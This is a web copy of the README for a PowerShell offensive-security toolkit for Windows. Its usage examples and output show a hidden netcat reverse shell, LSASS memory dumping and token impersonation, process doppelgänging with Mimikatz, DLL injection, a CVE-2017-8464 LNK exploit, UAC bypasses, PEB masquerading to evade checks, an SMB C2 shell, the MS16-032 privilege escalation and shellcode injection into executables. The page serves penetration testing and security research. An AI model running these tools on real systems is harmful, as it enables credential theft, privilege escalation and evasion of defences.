<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Home: Musings with PowerShell</title>
</head><body>https://github.com/FuzzySecurity/PowerShell-Suite <br/>
<br/>
PowerShell-Suite<br/>
There are great tools and resources online to accomplish most any task in PowerShell, sometimes however, there is a need to script together a util for a specific purpose or to bridge an ontological gap. This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.<br/>
<br/>
As such the mileage you get out of them may vary but feel free to post issues or fork &amp; adapt!<br/>
<br/>
Windows API<br/>
Some resources to consult on Windows API access from PowerShell:<br/>
<br/>
FuzzySecurity: <a href="http://www.fuzzysecurity.com/tutorials/24.html">Low-Level Windows API Access From PowerShell</a><br/>
Microsoft TechNet:<a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/">Use PowerShell to Interact with the Windows API</a><br/>
Exploit Monday:<a href="http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html">Accessing the Windows API in PowerShell via internal .NET methods and reflection</a><br/>
Exploit Monday: <a href="http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html">Deep Reflection - Defining Structs and Enums in PowerShell</a><br/>
<br/>
Invoke-Runas<br/>
Functionally equivalent to Windows &quot;runas.exe&quot;, using Advapi32::CreateProcessWithLogonW.<br/>
<br/>
Start cmd with a local account.<br/>
C:\PS&gt; Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1<br/>
<br/>
Start cmd with remote credentials. Equivalent to &quot;/netonly&quot; in runas.<br/>
C:\PS&gt; Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2<br/>
Invoke-NetSessionEnum<br/>
Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.<br/>
<br/>
Enumerate active sessions on &quot;SomeHostName&quot;.<br/>
C:\PS&gt; Invoke-NetSessionEnum -HostName SomeHostName<br/>
Invoke-CreateProcess<br/>
Use Kernel32::CreateProcess to achieve fine-grained control over process creation from PowerShell.<br/>
<br/>
Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW<br/>
C:\PS&gt; Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1<br/>
<br/>
Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW<br/>
C:\PS&gt; Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args &quot;-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe&quot; -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1<br/>
Detect-Debug<br/>
Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.<br/>
<br/>
Sample below is x64 Win8, WinDbg attached to PowerShell.<br/>
C:\PS&gt; Detect-Debug<br/>
<br/>
[+] Detect Kernel-Mode Debugging<br/>
  [?] SystemKernelDebuggerInformation: False<br/>
<br/>
[+] Detect User-Mode Debugging<br/>
  [?] CloseHandle Exception: Detected<br/>
  [?] IsDebuggerPresent: Detected<br/>
  [?] CheckRemoteDebuggerPresent: Detected<br/>
  [?] PEB!BeingDebugged: Detected<br/>
  [?] PEB!NtGlobalFlag: Detected<br/>
  [?] DebugSelf: Detected<br/>
Get-Handles<br/>
Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.<br/>
<br/>
Get handles for PID 2288<br/>
C:\PS&gt; Get-Handles -ProcID 2288<br/>
<br/>
[&gt;] PID 2288 --&gt; notepad<br/>
[+] Calling NtQuerySystemInformation::SystemHandleInformation<br/>
[?] Success, allocated 449300 byte result buffer<br/>
<br/>
[&gt;] Result buffer contains 28081 SystemHandleInformation objects<br/>
[&gt;] PID 2288 has 71 handle objects<br/>
<br/>
PID ObjectType   HandleFlags    Handle KernelPointer AccessMask<br/>
--- ----------   -----------    ------ ------------- ----------<br/>
2288 Directory    NONE        0x0004 0x88E629F0  0x00000000<br/>
2288 File      NONE        0x0008 0x84560C98  0x00100000<br/>
2288 File      NONE        0x000C 0x846164F0  0x00100000<br/>
2288 Key       NONE        0x0010 0xA3067A80  0x00020000<br/>
2288 ALPC Port    NONE        0x0014 0x8480C810  0x001F0000<br/>
2288 Mutant     NONE        0x0018 0x8591FEB8  0x001F0000<br/>
2288 Key       NONE        0x001C 0x96719C48  0x00020000<br/>
2288 Event      NONE        0x0020 0x850C6838  0x001F0000<br/>
...Snip...<br/>
Get-TokenPrivs<br/>
Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.<br/>
<br/>
Get token privileges for PID 3836<br/>
C:\PS&gt; Get-TokenPrivs -ProcID 3836<br/>
<br/>
[?] PID 3836 --&gt; calc<br/>
[+] Process handle: 1428<br/>
[+] Token handle: 1028<br/>
[+] Token has 5 privileges:<br/>
<br/>
LUID Privilege<br/>
---- ---------<br/>
 19 SeShutdownPrivilege<br/>
 23 SeChangeNotifyPrivilege<br/>
 25 SeUndockPrivilege<br/>
 33 SeIncreaseWorkingSetPrivilege<br/>
 34 SeTimeZonePrivilege<br/>
Get-Exports<br/>
Get-Exports, fetches DLL exports and optionally provides C++ wrapper output (idential to ExportsToC++ but without needing VS and a compiled binary). To do this it reads DLL bytes into memory and then parses them (no LoadLibraryEx). Because of this you can parse x32/x64 DLL's regardless of the bitness of PowerShell.<br/>
<br/>
PS C:\&gt; Get-Exports -DllPath C:\Windows\System32\ubpm.dll<br/>
<br/>
[?] 32-bit Image!<br/>
<br/>
[&gt;] Time Stamp: 07/15/2016 18:07:55<br/>
[&gt;] Function Count: 16<br/>
[&gt;] Named Functions: 16<br/>
[&gt;] Ordinal Base: 1<br/>
[&gt;] Function Array RVA: 0x2F578<br/>
[&gt;] Name Array RVA: 0x2F5B8<br/>
[&gt;] Ordinal Array RVA: 0x2F5F8<br/>
<br/>
Ordinal ImageRVA  FunctionName<br/>
------- --------  ------------<br/>
   1 0x000242A0 UbpmAcquireJobBackgroundMode<br/>
   2 0x00004750 UbpmApiBufferFree<br/>
   3 0x00004E30 UbpmCloseTriggerConsumer<br/>
   4 0x000135E0 UbpmInitialize<br/>
   5 0x00008D00 UbpmOpenTriggerConsumer<br/>
   6 0x000242C0 UbpmReleaseJobBackgroundMode<br/>
   7 0x00013230 UbpmSessionStateChanged<br/>
   8 0x000242E0 UbpmTerminate<br/>
   9 0x00003BD0 UbpmTriggerConsumerConfigure<br/>
  10 0x000040C0 UbpmTriggerConsumerControl<br/>
  11 0x00025B10 UbpmTriggerConsumerControlNotifications<br/>
  12 0x00025B40 UbpmTriggerConsumerQueryStatus<br/>
  13 0x0000E1B0 UbpmTriggerConsumerRegister<br/>
  14 0x000043F0 UbpmTriggerConsumerSetDisabledForUser<br/>
  15 0x00012480 UbpmTriggerConsumerSetStatePublishingSecurity<br/>
  16 0x00005330 UbpmTriggerConsumerUnregister<br/>
Get-SystemModuleInformation<br/>
Use NtQuerySystemInformation::SystemModuleInformation to get a list of loaded modules, their base address and size (x32/x64).<br/>
<br/>
PS C:\&gt; Get-SystemModuleInformation<br/>
<br/>
[+] Calling NtQuerySystemInformation::SystemModuleInformation<br/>
[?] Success, allocated 55656 byte result buffer<br/>
[?] Result buffer contains 188 SystemModuleInformation objects<br/>
<br/>
ImageBase     ImageSize ImageName<br/>
---------     --------- ---------<br/>
0xFFFFF80314C0D000 0x749000 \SystemRoot\system32\ntoskrnl.exe<br/>
0xFFFFF80315356000 0x6C000  \SystemRoot\system32\hal.dll<br/>
0xFFFFF803149ED000 0x9000  \SystemRoot\system32\kd.dll<br/>
0xFFFFF88000CB5000 0x5C000  \SystemRoot\System32\drivers\CLFS.SYS<br/>
0xFFFFF88000D11000 0x23000  \SystemRoot\System32\drivers\tm.sys<br/>
0xFFFFF88000D34000 0x15000  \SystemRoot\system32\PSHED.dll<br/>
0xFFFFF88000D49000 0xA000  \SystemRoot\system32\BOOTVID.dll<br/>
0xFFFFF88000D53000 0x7F000  \SystemRoot\system32\CI.dll<br/>
0xFFFFF88001068000 0x63000  \SystemRoot\System32\drivers\msrpc.sys<br/>
0xFFFFF880010CB000 0xC2000  \SystemRoot\system32\drivers\Wdf01000.sys<br/>
0xFFFFF8800118D000 0x10000  \SystemRoot\system32\drivers\WDFLDR.SYS<br/>
...Snip...<br/>
Expose-NetAPI<br/>
A crude tool to expose .NET API classes to PowerShell through reflection. This includes internal private classes, such as Microsoft.Win32.UnsafeNativeMethods.<br/>
<br/>
# Not all namespaces are available by default in<br/>
# PowerShell, MSDN/Google is your friend!<br/>
C:\PS&gt; Expose-NetAPI -Search bitmap<br/>
<br/>
[!] Search returned no results, try specifying the namespace!<br/>
<br/>
C:\PS&gt; Expose-NetAPI -Search bitmap -Namespace System.Drawing<br/>
<br/>
Assembly      TypeName             Name            Definition<br/>
--------      --------             ----            ----------<br/>
System.Drawing.dll System.Windows.Forms.DpiHelper  CreateResizedBitmap     static System.Drawing.Bitmap Crea...<br/>
System.Drawing.dll System.Windows.Forms.DpiHelper  ScaleBitmapLogicalToDevice static void ScaleBitmapLogicalToD...<br/>
System.Drawing.dll System.Drawing.Bitmap       FromHbitmap         static System.Drawing.Bitmap From...<br/>
System.Drawing.dll System.Drawing.BitmapSelector   CreateBitmap        static System.Drawing.Bitmap Crea...<br/>
System.Drawing.dll System.Drawing.Image       FromHbitmap         static System.Drawing.Bitmap From...<br/>
System.Drawing.dll System.Drawing.SafeNativeMethods CreateBitmap        static System.IntPtr CreateBitmap...<br/>
System.Drawing.dll System.Drawing.SafeNativeMethods CreateCompatibleBitmap   static System.IntPtr CreateCompat...<br/>
System.Drawing.dll System.Drawing.SafeNativeMethods IntCreateBitmap       static System.IntPtr IntCreateBit...<br/>
System.Drawing.dll System.Drawing.SafeNativeMethods IntCreateCompatibleBitmap  static System.IntPtr IntCreateCom...<br/>
System.Drawing.dll System.Drawing.Imaging.Metafile  FromHbitmap         static System.Drawing.Bitmap From...<br/>
<br/>
# Often multiple options available with differing<br/>
# definitions. Take care when selecting the desired<br/>
# API.<br/>
C:\PS&gt; Expose-NetAPI -Search drawbutton |Select Assembly,TypeName,Name |ft<br/>
<br/>
Assembly         TypeName                      Name<br/>
--------         --------                      ----<br/>
System.Windows.Forms.dll System.Windows.Forms.ButtonRenderer        DrawButton<br/>
System.Windows.Forms.dll System.Windows.Forms.ControlPaint         DrawButton<br/>
System.Windows.Forms.dll System.Windows.Forms.DataGridViewButtonCell+Da... DrawButton<br/>
<br/>
# Take care when directly calling enable, a number<br/>
# of assemblies are not loaded by default!<br/>
C:\PS&gt; Expose-NetAPI -Enable -Assembly System.Windows.Forms.dll -TypeName System.Windows.Forms.SafeNativeMethods<br/>
<br/>
[!] Unable to locate specified assembly!<br/>
<br/>
C:\PS&gt; Expose-NetAPI -Load System.Windows.Forms<br/>
True<br/>
<br/>
C:\PS&gt; Expose-NetAPI -Enable -Assembly System.Windows.Forms.dll -TypeName System.Windows.Forms.SafeNativeMethods<br/>
<br/>
[+] Created $SystemWindowsFormsSafeNativeMethods!<br/>
<br/>
# Once enabled the TypeName is exposed as a global<br/>
# variable and can be used to call any API's it includes!<br/>
C:\PS&gt; Expose-NetAPI -Enable -Assembly System.dll -TypeName Microsoft.Win32.UnsafeNativeMethods |Out-Null<br/>
C:\PS&gt; Expose-NetAPI -Enable -Assembly System.dll -TypeName Microsoft.Win32.SafeNativeMethods |Out-Null<br/>
C:\PS&gt; $ModHandle = $MicrosoftWin32UnsafeNativeMethods::GetModuleHandle(&quot;kernel32.dll&quot;)<br/>
C:\PS&gt; $Kernel32Ref = New-Object System.Runtime.InteropServices.HandleRef([IntPtr]::Zero,$ModHandle)<br/>
C:\PS&gt; $Beep = $MicrosoftWin32UnsafeNativeMethods::GetProcAddress($Kernel32Ref, &quot;Beep&quot;)<br/>
C:\PS&gt; $MicrosoftWin32SafeNativeMethods::MessageBox([IntPtr]::Zero,$(&quot;{0:X}&quot; -f [int64]$Beep),&quot;Beep&quot;,0)<br/>
Get-ProcessMiniDump<br/>
Create process dump using Dbghelp::MiniDumpWriteDump.<br/>
<br/>
# Elevated user dumping elevated process<br/>
<br/>
C:\PS&gt; (Get-Process lsass).Id<br/>
528<br/>
<br/>
C:\PS&gt; $CallResult = Get-ProcessMiniDump -ProcID 528 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose<br/>
VERBOSE: [?] Running as: Administrator<br/>
VERBOSE: [?] Administrator privileges required<br/>
VERBOSE: [&gt;] Administrator privileges held<br/>
VERBOSE: [&gt;] Process dump success!<br/>
<br/>
C:\PS&gt; $CallResult<br/>
True<br/>
<br/>
# low priv user dumping low priv process<br/>
<br/>
C:\PS&gt; (Get-Process calc).Id<br/>
2424<br/>
<br/>
C:\PS&gt; $CallResult = Get-ProcessMiniDump -ProcID 2424 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose<br/>
VERBOSE: [?] Running as: asenath.waite<br/>
VERBOSE: [&gt;] Process dump success!<br/>
<br/>
C:\PS&gt; $CallResult<br/>
True<br/>
<br/>
# low priv user dumping elevated process<br/>
C:\PS&gt; $CallResult = Get-ProcessMiniDump -ProcID 4 -Path C:\Users\asenath.waite\Desktop\tmp.ini -Verbose<br/>
VERBOSE: [?] Running as: asenath.waite<br/>
VERBOSE: [?] Administrator privileges required<br/>
VERBOSE: [!] Administrator privileges not held!<br/>
<br/>
C:\PS&gt; $CallResult<br/>
False<br/>
Get-SystemProcessInformation<br/>
Use NtQuerySystemInformation::SystemProcessInformation to get a detailed list of processes and process properties. On close inspection you will find that many process monitors such as Sysinternals Process Explorer or Process Hacker use this information class (in addition to SystemPerformanceInformation, SystemProcessorPerformanceInformation and SystemProcessorCycleTimeInformation).<br/>
<br/>
# Return full process listing<br/>
C:\PS&gt; Get-SystemProcessInformation<br/>
<br/>
# Return only specific PID<br/>
C:\PS&gt; Get-SystemProcessInformation -ProcID 1336<br/>
<br/>
PID            : 1336<br/>
InheritedFromPID      : 1020<br/>
ImageName         : svchost.exe<br/>
Priority          : 8<br/>
CreateTime         : 0d:9h:8m:47s<br/>
UserCPU          : 0d:0h:0m:0s<br/>
KernelCPU         : 0d:0h:0m:0s<br/>
ThreadCount        : 12<br/>
HandleCount        : 387<br/>
PageFaults         : 7655<br/>
SessionId         : 0<br/>
PageDirectoryBase     : 3821568<br/>
PeakVirtualSize      : 2097249.796875 MB<br/>
VirtualSize        : 2097240.796875 MB<br/>
PeakWorkingSetSize     : 11.65625 MB<br/>
WorkingSetSize       : 6.2109375 MB<br/>
QuotaPeakPagedPoolUsage  : 0.175910949707031 MB<br/>
QuotaPagedPoolUsage    : 0.167121887207031 MB<br/>
QuotaPeakNonPagedPoolUsage : 0.0151519775390625 MB<br/>
QuotaNonPagedPoolUsage   : 0.0137710571289063 MB<br/>
PagefileUsage       : 3.64453125 MB<br/>
PeakPagefileUsage     : 4.14453125 MB<br/>
PrivatePageCount      : 3.64453125 MB<br/>
ReadOperationCount     : 0<br/>
WriteOperationCount    : 0<br/>
OtherOperationCount    : 223<br/>
ReadTransferCount     : 0<br/>
WriteTransferCount     : 0<br/>
OtherTransferCount     : 25010<br/>
<br/>
# Possibly returns multiple processes<br/>
# eg: notepad.exe &amp; notepad++.exe<br/>
C:\PS&gt; Get-SystemProcessInformation -ProcName note<br/>
pwnd<br/>
Start-Eidolon<br/>
This is a proof-of-concept for doppelgänging, which was recently presented by enSilo at BlackHat EU. In simple terms this process involves creating an NTFS transaction from a file on disk (any file will do). Next we overwrite the file in memory, create a section from the modified file and launch a process based on that section. Afterwards we roll back the transaction, leaving the original file unchanged but we end up with a process that appears to be backed by the original file. For a more complete description please review the reference in the script.<br/>
<br/>
# Create a doppelgänger from a file on disk with explorer as the parent.<br/>
# x64 Win10 RS3<br/>
C:\PS&gt; Start-Eidolon -Target C:\Some\File.Path -Eidolon C:\Some\Other\File.Path -ParentPID 12784 -Verbose<br/>
VERBOSE: [+] Created transaction object<br/>
VERBOSE: [+] Created transacted file<br/>
VERBOSE: [+] Overwriting transacted file<br/>
VERBOSE: [+] Created section from transacted file<br/>
VERBOSE: [+] Rolled back transaction changes<br/>
VERBOSE: [+] Opened handle to the parent =&gt; explorer<br/>
VERBOSE: [+] Created process from section<br/>
VERBOSE: [+] Acquired Eidolon PBI<br/>
VERBOSE: [+] Eidolon architecture is 64-bit<br/>
VERBOSE: [+] Eidolon image base: 0x7FF6A0570000<br/>
VERBOSE: [+] Eidolon entry point: 0x7FF6A05E40C8<br/>
VERBOSE: [+] Created Eidolon process parameters<br/>
VERBOSE: [+] Allocated memory in Eidolon<br/>
VERBOSE: [+] Process parameters duplicated into Eidolon<br/>
VERBOSE: [+] Rewrote Eidolon-&gt;PEB-&gt;pProcessParameters<br/>
VERBOSE: [+] Created Eidolon main thread..<br/>
True<br/>
<br/>
# Create a fileless Mimikatz doppelgänger with PowerShell as the parent.<br/>
# x32 Win7<br/>
C:\PS&gt; Start-Eidolon -Target C:\Some\File.Path -Mimikatz -Verbose<br/>
VERBOSE: [+] Created transaction object<br/>
VERBOSE: [+] Created transacted file<br/>
VERBOSE: [+] Overwriting transacted file<br/>
VERBOSE: [+] Created section from transacted file<br/>
VERBOSE: [+] Rolled back transaction changes<br/>
VERBOSE: [+] Created process from section<br/>
VERBOSE: [+] Acquired Eidolon PBI<br/>
VERBOSE: [+] Eidolon architecture is 32-bit<br/>
VERBOSE: [+] Eidolon image base: 0x400000<br/>
VERBOSE: [+] Eidolon entry point: 0x4572D2<br/>
VERBOSE: [+] Created Eidolon process parameters<br/>
VERBOSE: [+] Allocated memory in Eidolon<br/>
VERBOSE: [+] Process parameters duplicated into Eidolon<br/>
VERBOSE: [+] Rewrote Eidolon-&gt;PEB-&gt;pProcessParameters<br/>
VERBOSE: [+] Created Eidolon main thread..<br/>
True<br/>
Stage-RemoteDll<br/>
Stage-RemoteDll is a small function to demonstrate various Dll injection techniques (NtCreateThreadEx / QueueUserAPC / SetThreadContext / SetWindowsHookEx) on 32 and 64 bit architectures. While I have done some input validation &amp; cleanup, this is mostly POC code. Note also that these techniques can easily be repurposed to directly execute shellcode in the remote process.<br/>
<br/>
# Boolean return value<br/>
C:\PS&gt; $CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx<br/>
C:\PS&gt; $CallResult<br/>
True<br/>
<br/>
# Verbose output<br/>
C:\PS&gt; Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode QueueUserAPC -Verbose<br/>
VERBOSE: [+] Using QueueUserAPC<br/>
VERBOSE: [&gt;] Opening notepad<br/>
VERBOSE: [&gt;] Allocating DLL path memory<br/>
VERBOSE: [&gt;] Writing DLL string<br/>
VERBOSE: [&gt;] Locating LoadLibraryA<br/>
VERBOSE: [&gt;] Getting process threads<br/>
VERBOSE: [&gt;] Registering APC's with all threads<br/>
VERBOSE:  --&gt; Success, registered APC<br/>
VERBOSE:  --&gt; Success, registered APC<br/>
VERBOSE:  --&gt; Success, registered APC<br/>
VERBOSE:  --&gt; Success, registered APC<br/>
VERBOSE: [&gt;] Cleaning up..<br/>
True<br/>
Export-LNKPwn<br/>
Create LNK files to exploit CVE-2017-8464 aka LNK round 3 ;))!<br/>
<br/>
Currently, it is recommended that you create the lnk locally and then move it to the target system because of .Net and PowerShell dependencies. Please refer to the function synopsis for further details.<br/>
<br/>
C:\PS&gt; Export-LNKPwn -LNKOutPath C:\Some\Local\Path.lnk -TargetCPLPath C:\Target\CPL\Path.cpl -Type SpecialFolderDataBlock<br/>
UAC-TokenMagic<br/>
Based on James Forshaw's three part post on UAC, linked below, and possibly a technique used by the CIA!<br/>
<br/>
Essentially we duplicate the token of an elevated process, lower it's mandatory integrity level, use it to create a new restricted token, impersonate it and use the Secondary Logon service to spawn a new process with High IL. Like playing hide-and-go-seek with tokens! ;))<br/>
<br/>
This technique even bypasses the AlwaysNotify setting provided you supply it with a PID for an elevated process.<br/>
<br/>
Targets: 7,8,8.1,10,10RS1,10RS2<br/>
<br/>
C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args &quot;/c calc.exe&quot; -ProcPID 1116<br/>
<br/>
[*] Session is not elevated<br/>
[*] Successfully acquired regedit handle<br/>
[*] Opened process token<br/>
[*] Duplicated process token<br/>
[*] Initialized MedIL SID<br/>
[*] Lowered token mandatory IL<br/>
[*] Created restricted token<br/>
[*] Duplicated restricted token<br/>
[*] Successfully impersonated security context<br/>
[*] Magic..<br/>
Bypass-UAC<br/>
Bypass-UAC provides a framework to perform UAC bypasses based on auto elevating IFileOperation COM object method calls. This is not a new technique, traditionally, this is accomplished by injecting a DLL into “explorer.exe”. This is not desirable because injecting into explorer may trigger security alerts and working with unmanaged DLL’s makes for an inflexible work-flow.<br/>
<br/>
To get around this, Bypass-UAC implements a function which rewrites PowerShell’s PEB to give it the appearance of “explorer.exe”. This provides the same effect because COM objects exclusively rely on Windows’s Process Status API (PSAPI) which reads the process PEB.<br/>
<br/>
C:\PS&gt; Bypass-UAC -Method ucmDismMethod<br/>
<br/>
[!] Impersonating explorer.exe!<br/>
[+] PebBaseAddress: 0x000007F73E93F000<br/>
[!] RtlEnterCriticalSection --&gt; &amp;Peb-&gt;FastPebLock<br/>
[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.ImagePathName: 0x000000569B5F1780<br/>
[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.CommandLine: 0x000000569B5F1790<br/>
[?] Traversing &amp;Peb-&gt;Ldr-&gt;InLoadOrderModuleList doubly linked list<br/>
[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x000000569B5F2208<br/>
[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x000000569B5F2218<br/>
[!] RtlLeaveCriticalSection --&gt; &amp;Peb-&gt;FastPebLock<br/>
<br/>
[&gt;] Dropping proxy dll..<br/>
[+] 64-bit Yamabiko: C:\Users\b33f\AppData\Local\Temp\yam1730961377.tmp<br/>
[&gt;] Creating XML trigger: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml<br/>
[&gt;] Performing elevated IFileOperation::MoveItem operation..<br/>
<br/>
[?] Executing PkgMgr..<br/>
[!] UAC artifact: C:\Windows\System32\dismcore.dll<br/>
[!] UAC artifact: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml<br/>
Masquerade-PEB<br/>
Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's PEB. From there it replaces a number of UNICODE_STRING structs in memory to give powershell the appearance of a different process. Specifically, the function will overwrite powershell's &quot;ImagePathName&quot; &amp; &quot;CommandLine&quot; in _RTL_USER_PROCESS_PARAMETERS and the &quot;FullDllName&quot; &amp; &quot;BaseDllName&quot; in the _LDR_DATA_TABLE_ENTRY linked list.<br/>
<br/>
This can be useful as it would fool any Windows work-flows which rely solely on the Process Status API to check process identity.<br/>
<br/>
C:\PS&gt; Masquerade-PEB -BinPath C:\Windows\System32\notepad.exe<br/>
<br/>
[?] PID 2756<br/>
[+] PebBaseAddress: 0x7FFD3000<br/>
[!] RtlEnterCriticalSection --&gt; &amp;Peb-&gt;FastPebLock<br/>
[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.ImagePathName: 0x002F11F8<br/>
[&gt;] Overwriting &amp;Peb-&gt;ProcessParameters.CommandLine: 0x002F1200<br/>
[?] Traversing &amp;Peb-&gt;Ldr-&gt;InLoadOrderModuleList doubly linked list<br/>
[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x002F1B74<br/>
[&gt;] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x002F1B7C<br/>
[!] RtlLeaveCriticalSection --&gt; &amp;Peb-&gt;FastPebLock<br/>
Invoke-SMBShell<br/>
POC shell using named pipes (System.IO.Pipes) as a C2 channel. The SMB traffic is encrypted using AES CBC (code from Empire), the key/pipe are generated randomly by the server on start-up.<br/>
<br/>
Server:<br/>
<br/>
PS C:\&gt; Invoke-SMBShell<br/>
<br/>
+-------<br/>
| Host Name: 0AK<br/>
| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9<br/>
| AES Key: q6EKfuJTX93YUnmX<br/>
+-------<br/>
<br/>
[&gt;] Waiting for client..<br/>
<br/>
<br/>
SMB shell: whoami<br/>
0ak\b33f<br/>
<br/>
SMB shell: IdontExist<br/>
The term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.<br/>
<br/>
SMB shell: $PSVersionTable<br/>
Name              Value<br/>
----              -----<br/>
PSRemotingProtocolVersion   2.2<br/>
BuildVersion          6.2.9200.17065<br/>
PSCompatibleVersions      {1.0, 2.0, 3.0}<br/>
PSVersion           3.0<br/>
CLRVersion           4.0.30319.42000<br/>
WSManStackVersion       3.0<br/>
SerializationVersion      1.1.0.1<br/>
<br/>
SMB shell: leave<br/>
<br/>
[!] Client disconnecting..<br/>
<br/>
[&gt;] Waiting for client..<br/>
<br/>
<br/>
SMB shell: calc<br/>
Job SMBJob-dVkIkAkXINjMe09S completed successfully!<br/>
<br/>
SMB shell: exit<br/>
<br/>
[!] Client disconnecting..<br/>
[!] Terminating server..<br/>
<br/>
PS C:\&gt;<br/>
Client:<br/>
<br/>
# Client disconnected because of &quot;leave&quot; command<br/>
PS C:\&gt; Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9<br/>
# Client disconnected because &quot;exit&quot; command kills client/server<br/>
PS C:\&gt; Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9<br/>
Conjure-LSASS<br/>
Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.<br/>
<br/>
Conjure LSASS into our midst! ;)<br/>
C:\PS&gt; Conjure-LSASS<br/>
<br/>
[?] SeDebugPrivilege is available!<br/>
<br/>
[+] Current process handle: 852<br/>
<br/>
[&gt;] Calling Advapi32::OpenProcessToken<br/>
[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000<br/>
<br/>
[?] SeDebugPrivilege is enabled!<br/>
<br/>
[&gt;] Calling Advapi32::OpenProcessToken --&gt; LSASS<br/>
[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512<br/>
<br/>
[&gt;] Calling Advapi32::DuplicateToken --&gt; LSASS<br/>
[+] Duplicate token handle with SecurityImpersonation level: 2008<br/>
<br/>
[&gt;] Calling Advapi32::SetThreadToken<br/>
[+] Knock knock .. who's there .. LSASS<br/>
[+] User context: SYSTEM<br/>
<br/>
C:\PS&gt; whoami<br/>
ERROR: Access is denied.<br/>
ERROR: Access is denied.<br/>
<br/>
C:\PS&gt; Get-ChildItem -Path hklm:SAM<br/>
<br/>
  Hive: HKEY_LOCAL_MACHINE\SAM<br/>
<br/>
<br/>
SKC VC Name              Property<br/>
--- -- ----              --------<br/>
 3  2 SAM              {C, ServerDomainUpdates}<br/>
Invoke-MS16-032<br/>
PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).<br/>
<br/>
Targets:<br/>
<br/>
Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!<br/>
Tested on x32 Win7, x64 Win8, x64 2k12R2<br/>
==&gt; Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!<br/>
<br/>
Sit back and watch the pwn!<br/>
C:\PS&gt; Invoke-MS16-032<br/>
    __ __ ___ ___  ___   ___ ___ ___<br/>
    | V | _|_ | | _|___|  |_ |_ |<br/>
    |   |_ |_| |_| . |___| | |_ | _|<br/>
    |_|_|_|___|_____|___|  |___|___|___|<br/>
<br/>
           [by b33f -&gt; @FuzzySec]<br/>
<br/>
[?] Operating system core count: 2<br/>
[&gt;] Duplicating CreateProcessWithLogonW handle<br/>
[?] Done, using thread handle: 956<br/>
<br/>
[*] Sniffing out privileged impersonation token..<br/>
<br/>
[?] Thread belongs to: svchost<br/>
[+] Thread suspended<br/>
[&gt;] Wiping current impersonation token<br/>
[&gt;] Building SYSTEM impersonation token<br/>
[?] Success, open SYSTEM token handle: 964<br/>
[+] Resuming thread..<br/>
<br/>
[*] Sniffing out SYSTEM shell..<br/>
<br/>
[&gt;] Duplicating SYSTEM token<br/>
[&gt;] Starting token race<br/>
[&gt;] Starting process race<br/>
[!] Holy handle leak Batman, we have a SYSTEM shell!!<br/>
<br/>
Subvert-PE<br/>
Inject shellcode into a PE image while retaining the PE functionality.<br/>
<br/>
For additional information, please refer to:<br/>
<br/>
FuzzySecurity: Powershell PE Injection, this is not the Calc you are looking for!<br/>
Analyse the PE header and hexdump the region of memory where shellcode would be injected.<br/>
C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exe<br/>
<br/>
Same as above but continue to inject shellcode and overwrite the binary.<br/>
C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exe -Write<br/>
Utility<br/>
Get-LimitChildItem<br/>
Depth limited wrapper for Get-ChildItem with basic filter functionality.<br/>
<br/>
# UNC path txt file search<br/>
